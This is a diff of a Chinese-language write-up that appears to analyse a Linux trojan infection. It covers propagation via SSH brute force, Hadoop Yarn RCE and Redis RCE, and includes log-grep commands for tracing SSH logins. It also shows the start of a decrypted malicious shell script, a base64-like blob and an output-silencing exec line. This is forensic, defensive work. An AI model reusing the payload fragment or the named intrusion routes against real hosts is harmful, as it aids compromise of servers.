@@ -36,8 +36,6 @@ author: 0e0w
 
 - 解密之后
 
-  - 
-
   ```bash
   CgRvlui+rPkiCq7fgarZne3aI54Cz71ugd8nPMnGeugoxg/gRZFBAwgxztGqF7xE
   exec &>/dev/null
@@ -110,9 +108,11 @@ author: 0e0w
 ## 0x03 传播方式
 
 - SSH爆破
-  - cd /var/log && cat secure | grep "Accepted" && cat secure | grep "Failed"
+
+  > cd /var/log && cat secure | grep "Accepted" && cat secure | grep "Failed"
 - Hadoop RCE
-  - 未找到Hadoop的Yarn访问日志，此处无法进行溯源。
+
+  > 未找到Hadoop的Yarn访问日志，此处无法进行溯源。Hadoop Yarn未授权导致的RCE漏洞已经复现。	
 - Redis RCE
 
 ## 0x04 木马清理
